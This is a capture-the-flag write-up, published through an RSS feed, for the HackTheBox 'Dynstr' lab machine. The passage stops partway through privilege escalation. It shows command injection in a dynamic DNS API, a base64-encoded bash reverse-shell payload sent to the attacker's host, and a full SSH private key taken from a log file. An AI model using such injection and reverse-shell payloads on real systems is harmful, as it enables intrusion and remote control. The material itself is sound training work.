<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Command-injection on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/command-injection/</link>
    <description>Recent content in Command-injection on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Mon, 18 Oct 2021 03:04:29 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/command-injection/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Dynstr</title>
      <link>https://fahmifj.github.io/hackthebox/dynstr/</link>
      <pubDate>Mon, 18 Oct 2021 03:04:29 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/dynstr/</guid>
      <description>Dynstr imitates a company that offers a Dynamic DNS service. The provided API for this service is vulnerable to command injection, allowing me to gain initial access to the system. Enumerating inside the system reveals log files that leak the user SSH key that can only be used after manipulating the DNS records. For the root part, there is a custom script that is vulnerable to wildcard injection. Since the script can be run as root with sudo, it is possible to gain root access from it.</description>
      <content:encoded><![CDATA[<p>Dynstr imitates a company that offers a Dynamic DNS service. The provided API for this service is vulnerable to command injection, allowing me to gain initial access to the system. Enumerating inside the system reveals log files that leak the user SSH key that can only be used after manipulating the DNS records. For the root part, there is a custom script that is vulnerable to wildcard injection. Since the script can be run as root with sudo, it is possible to gain root access from it.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Command injection</li>
<li>Dynamic DNS</li>
<li>Wildcard injection</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan with <code>nmap</code> discovers 3 open ports: SSH on 22, BIND 9 DNS on 53, and an Apache web server on 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ nmap -p- --min-rate <span class="m">1000</span> --reason -oA nmap/10-tcp-allport-dynstr 10.10.10.244
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-16 21:06 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.244
</span></span><span class="line"><span class="cl">Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.078s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65532</span> closed ports
</span></span><span class="line"><span class="cl">Reason: <span class="m">65532</span> resets
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE REASON
</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">53/tcp open  domain  syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 41.14 seconds
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ nmap -p22,53,80 -sC -sV -oA nmap/10-tcp-allport-scripts-dynstr 10.10.10.244
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-16 21:07 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.244
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.54s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">53/tcp open  domain  ISC BIND 9.16.1 <span class="o">(</span>Ubuntu Linux<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> dns-nsid: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  bind.version: 9.16.1-Ubuntu
</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Dyna DNS
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 20.76 seconds
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>On port 80, there is a company website named <strong>DYNA DNS</strong>.</p>
<p><div class="img-container"><img src="imgs/image-20210617082250725.png" alt="image-20210617082250725"  /></div>
</p>
<p>This company offers a <a href="https://www.youtube.com/watch?v=rOLGvZagdC0">dynamic DNS</a> service and states that the service is still in beta. There is also shared credentials to use this service.</p>
<p><div class="img-container"><img src="imgs/image-20210617082428463.png" alt="image-20210617082428463"  /></div>
</p>
<p>At the bottom of the page, it reveals another domain name: <code>dyna.htb</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210617082655557.png" alt="image-20210617082655557"  /></div>
</p>
<p>I will update my <code>/etc/hosts</code> with all the discovered domain names :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.244 dyna.htb dnsalias.htb dynamicdns.htb no-ip.htb&#39;</span> 
</span></span></code></pre></div><p>These domain points to the same site.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ curl -s http://10.10.10.244/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">10909</span>
</span></span><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ <span class="k">for</span> i in dyna.htb dnsalias.htb dynamicdns.htb no-ip.htb<span class="p">;</span> <span class="k">do</span> curl -s http://<span class="nv">$i</span>/ <span class="p">|</span> wc -c<span class="p">;</span> <span class="k">done</span> 
</span></span><span class="line"><span class="cl"><span class="m">10909</span>
</span></span><span class="line"><span class="cl"><span class="m">10909</span>
</span></span><span class="line"><span class="cl"><span class="m">10909</span>
</span></span><span class="line"><span class="cl"><span class="m">10909</span>
</span></span></code></pre></div><h3 id="dns-api">DNS API</h3>
<p>As previously stated in the website, it seems to use the dynamic DNS service, I can refer to <a href="https://www.noip.com/integrate/request">no-ip.com</a>:</p>
<p><div class="img-container"><img src="imgs/image-20210617090837052.png" alt="image-20210617090837052"  /></div>
</p>
<p>To use the service, I will send a request and supply the shared credentials (<code>'dynadns:sndanyd'</code>) in the Authorization header:</p>
<p><div class="img-container"><img src="imgs/image-20210617091044264.png" alt="image-20210617091044264"  /></div>
</p>
<p>It returned with <code>good</code>.</p>
<p>With <code>dig</code>, I can confirm that my domain name has been added to the DNS entry.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53»
</span></span><span class="line"><span class="cl">$ dig @10.10.10.244 iamf.no-ip.htb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; @10.10.10.244 iamf.no-ip.htb
</span></span><span class="line"><span class="cl"><span class="p">;</span> <span class="o">(</span><span class="m">1</span> server found<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> global options: +cmd
</span></span><span class="line"><span class="cl"><span class="p">;;</span> Got answer:
</span></span><span class="line"><span class="cl"><span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span class="m">38459</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> flags: qr aa rd<span class="p">;</span> QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> WARNING: recursion requested but not available
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> OPT PSEUDOSECTION:
</span></span><span class="line"><span class="cl"><span class="p">;</span> EDNS: version: 0, flags:<span class="p">;</span> udp: <span class="m">4096</span>
</span></span><span class="line"><span class="cl"><span class="p">;</span> COOKIE: a795fc705ec31c660100000060cab226fe335467b6b169e8 <span class="o">(</span>good<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> QUESTION SECTION:
</span></span><span class="line"><span class="cl"><span class="p">;</span>iamf.no-ip.htb.                        IN      A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> ANSWER SECTION:
</span></span><span class="line"><span class="cl">iamf.no-ip.htb.         <span class="m">30</span>      IN      A       10.10.14.53
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> Query time: <span class="m">864</span> msec
</span></span><span class="line"><span class="cl"><span class="p">;;</span> SERVER: 10.10.10.244#53<span class="o">(</span>10.10.10.244<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> WHEN: Wed Jun <span class="m">16</span> 22:23:34 EDT <span class="m">2021</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> MSG SIZE  rcvd: <span class="m">87</span>
</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="identify-command-injection">Identify Command Injection</h4>
<p>On Linux, there is a dynamic DNS utility called <a href="https://linux.die.net/man/8/nsupdate"><code>nsupdate</code></a>. If the backend uses this utility with no sanitization on the input, it is possible to do a command injection.</p>
<p>For the first attempt, I try to submit a semicolon, and it fails the update process.</p>
<p><div class="img-container"><img src="imgs/image-20210617091628552.png" alt="image-20210617091628552"  /></div>
</p>
<p>If I search for that error on Google, I will see <a href="https://stackoverflow.com/questions/46604333/nsupdate-fail-when-called-in-php-with-exec-function">this post</a> from StackOverflow, which shows how <code>nsupdate</code> is executed from PHP using the built-in <code>exec()</code> function.</p>
<p><div class="img-container"><img src="imgs/image-20211018060424803.png" alt="image-20211018060424803"  /></div>
</p>
<p>By assuming that my input falls in <code>update add $MYINPUT.no-ip.htb ...</code>, I try to submit  <strong>`echo+iamf1`</strong>.<div class="img-container"><img src="imgs/image-20210617093614041.png" alt="image-20210617093614041"  /></div>
</p>
<p>It again responded with &ldquo;good&rdquo;.</p>
<p>Checking with <code>dig</code> shows that my domain <code>iamf1.no-ip.htb</code> has been added to the DNS entry. This means the API is vulnerable to command injection.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53»
</span></span><span class="line"><span class="cl">$ dig @10.10.10.244 iamf1.no-ip.htb
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;</span> &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; @10.10.10.244 iamf1.no-ip.htb
</span></span><span class="line"><span class="cl"><span class="p">;</span> <span class="o">(</span><span class="m">1</span> server found<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> global options: +cmd
</span></span><span class="line"><span class="cl"><span class="p">;;</span> Got answer:
</span></span><span class="line"><span class="cl"><span class="p">;;</span> -&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span class="m">65360</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> flags: qr aa rd<span class="p">;</span> QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> WARNING: recursion requested but not available
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> OPT PSEUDOSECTION:
</span></span><span class="line"><span class="cl"><span class="p">;</span> EDNS: version: 0, flags:<span class="p">;</span> udp: <span class="m">4096</span>
</span></span><span class="line"><span class="cl"><span class="p">;</span> COOKIE: 8164817dd17125330100000060cab5248a60afa8ae9615d7 <span class="o">(</span>good<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> QUESTION SECTION:
</span></span><span class="line"><span class="cl"><span class="p">;</span>iamf1.no-ip.htb.               IN      A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> ANSWER SECTION:
</span></span><span class="line"><span class="cl">iamf1.no-ip.htb.        <span class="m">30</span>      IN      A       10.10.14.53
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">;;</span> Query time: <span class="m">735</span> msec
</span></span><span class="line"><span class="cl"><span class="p">;;</span> SERVER: 10.10.10.244#53<span class="o">(</span>10.10.10.244<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> WHEN: Wed Jun <span class="m">16</span> 22:36:20 EDT <span class="m">2021</span>
</span></span><span class="line"><span class="cl"><span class="p">;;</span> MSG SIZE  rcvd: <span class="m">88</span>
</span></span></code></pre></div><p>I also assume that the update command is enclosed with <code>EOF</code>, and when I put <code>&quot;</code> to enclose it, the server response leaks how it updates the DNS entry.</p>
<p><div class="img-container"><img src="imgs/image-20210617101554395.png" alt="image-20210617101554395"  /></div>
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>To avoid bad characters, I will encode the reverse shell payload with double base64.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.53/9000 0&gt;&amp;1&#39;&#34;</span> <span class="p">|</span>base64 <span class="p">|</span>base64 -w0
</span></span><span class="line"><span class="cl"><span class="nv">WW1GemFDQXRZeUFuWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0MU15ODVNREF3SURBK0pqRW5DZz09Cg</span><span class="o">==</span>
</span></span></code></pre></div><p>The final query will looks like this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/nic/update?hostname=&#34;`echo+WW1GemFDQXRZeUFuWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0MU15ODVNREF3SURBK0pqRW5DZz09Cg==+|base64+-d|base64+-d|bash`+iamf.no-ip.htb&amp;myip=10.10.14.53
</span></span></code></pre></div><p>On my listener</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9000</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.53<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.244<span class="o">]</span> <span class="m">49648</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>659<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">www-data@dynstr:/var/www/html/nic$ id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span></span></code></pre></div><p>I will upgrade my shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dynstr:/var/www/html/nic$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl">www-data@dynstr:/var/www/html/nic$ which python3
</span></span><span class="line"><span class="cl">which python3
</span></span><span class="line"><span class="cl">/usr/bin/python3
</span></span><span class="line"><span class="cl">www-data@dynstr:/var/www/html/nic$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;ython3 -c &#39;</span>import pty<span class="p">;</span>pty.spawn<span class="o">(</span><span class="s2">&#34;/bin/bash&#34;</span><span class="o">)</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">www-data@dynstr:/var/www/html/nic$ ^Z
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">7584</span> suspended  nc -nvlp <span class="m">9000</span>
</span></span><span class="line"><span class="cl">→ root@kali «dynstr» «10.10.14.53»
</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">7584</span> continued  nc -nvlp <span class="m">9000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">www-data@dynstr:/var/www/html/nic$ 
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-bindmgr">Shell as bindmgr</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Under <code>/home/bindmgr/support-case-C62796521</code>, there are several files that are readable by others.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dynstr:/home/bindmgr/support-case-C62796521$ ls -l
</span></span><span class="line"><span class="cl">total <span class="m">428</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> bindmgr bindmgr <span class="m">237141</span> Mar <span class="m">13</span> 14:53 C62796521-debugging.script
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> bindmgr bindmgr  <span class="m">29312</span> Mar <span class="m">13</span> 14:53 C62796521-debugging.timing
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> bindmgr bindmgr   <span class="m">1175</span> Mar <span class="m">13</span> 14:53 command-output-C62796521.txt
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> bindmgr bindmgr <span class="m">163048</span> Mar <span class="m">13</span> 14:52 strace-C62796521.txt
</span></span></code></pre></div><p>The <code>strace-C62796521.txt</code> file contains a SSH private key.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dynstr:/home/bindmgr/support-case-C62796521$ cat strace-C62796521.txt
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl"><span class="m">15123</span> openat<span class="o">(</span>AT_FDCWD, <span class="s2">&#34;/home/bindmgr/.ssh/id_rsa&#34;</span>, O_RDONLY<span class="o">)</span> <span class="o">=</span> <span class="m">5</span>
</span></span><span class="line"><span class="cl"><span class="m">15123</span> fstat<span class="o">(</span>5, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFREG<span class="p">|</span>0600, <span class="nv">st_size</span><span class="o">=</span>1823, ...<span class="o">})</span> <span class="o">=</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="m">15123</span> read<span class="o">(</span>5, <span class="s2">&#34;-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n&#34;</span>, 4096<span class="o">)</span> <span class="o">=</span> <span class="m">1823</span>
</span></span></code></pre></div><p>But when I try to use that key for SSH login, it asks for a password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «ssh-keys» «10.10.14.53»
</span></span><span class="line"><span class="cl">$ ssh -i bindmgr_rsa bindmgr@10.10.10.244
</span></span><span class="line"><span class="cl">bindmgr@10.10.10.244<span class="err">&#39;</span>s password:
</span></span></code></pre></div><p>My first guess is SSH has been configured to password only, but I find that <a href="https://unix.stackexchange.com/questions/56941/what-is-the-point-of-sshd-usedns-option">UseDNS</a> is enabled here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dynstr:/home$ cat /etc/ssh/sshd_config <span class="p">|</span> grep -v <span class="s1">&#39;^#&#39;</span> <span class="p">|</span> awk <span class="s1">&#39;NF&#39;</span>
</span></span><span class="line"><span class="cl">Include /etc/ssh/sshd_config.d/*.conf
</span></span><span class="line"><span class="cl">PermitRootLogin yes
</span></span><span class="line"><span class="cl">ChallengeResponseAuthentication no
</span></span><span class="line"><span class="cl">UsePAM yes
</span></span><span class="line"><span class="cl">X11Forwarding yes
</span></span><span class="line"><span class="cl">PrintMotd no
</span></span><span class="line"><span class="cl">UseDNS yes
</span></span><span class="line"><span class="cl">AcceptEnv LANG LC_*
</span></span><span class="line"><span class="cl">Subsystem       sftp    /usr/lib/openssh/sftp-server
</span></span></code></pre></div><p>Then if I look at the authorized keys, it seems SSH login only possible from a specific domain that starts with <code>*.infra.dyna.htb</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dynstr:/home/bindmgr$ ls -l .ssh/
</span></span><span class="line"><span class="cl">ls -l
</span></span><span class="line"><span class="cl">total <span class="m">16</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> bindmgr bindmgr  <span class="m">419</span> Mar <span class="m">13</span> 14:53 authorized_keys
</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> bindmgr bindmgr <span class="m">1823</span> Mar <span class="m">13</span> 14:53 id_rsa
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> bindmgr bindmgr  <span class="m">395</span> Mar <span class="m">13</span> 14:53 id_rsa.pub
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> bindmgr bindmgr  <span class="m">444</span> Mar <span class="m">13</span> 14:53 known_hosts
</span></span><span class="line"><span class="cl">www-data@dynstr:/home/bindmgr$ cat .ssh/authorized_keys
</span></span><span class="line"><span class="cl"><span class="nv">from</span><span class="o">=</span><span class="s2">&#34;*.infra.dyna.htb&#34;</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
</span></span></code></pre></div><h4 id="update-dns">Update DNS</h4>
<p>Looking at the DNS configuration under <code>/etc/bind</code> reveals that <code>dyna.htb</code> is not available for customers (via API) and it uses different key (<code>/etc/bind/infra.key</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@dynstr:/etc/bind/$ cat named.conf.local
</span></span><span class="line"><span class="cl">//
</span></span><span class="line"><span class="cl">// Do any <span class="nb">local</span> configuration here
</span></span><span class="line"><span class="cl">//
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// Add infrastructure DNS updates.
</span></span><span class="line"><span class="cl">include <span class="s2">&#34;/etc/bind/infra.key&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">zone <span class="s2">&#34;dyna.htb&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;dyna.htb.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant infra-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">zone <span class="s2">&#34;10.in-addr.arpa&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;10.in-addr.arpa.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant infra-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">zone <span class="s2">&#34;168.192.in-addr.arpa&#34;</span> IN <span class="o">{</span> <span class="nb">type</span> master<span class="p">;</span> file <span class="s2">&#34;168.192.in-addr.arpa.zone&#34;</span><span class="p">;</span> update-policy <span class="o">{</span> grant infra-key zonesub ANY<span class="p">;</span> <span class="o">}</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">// Enable DynDNS updates to customer zones.
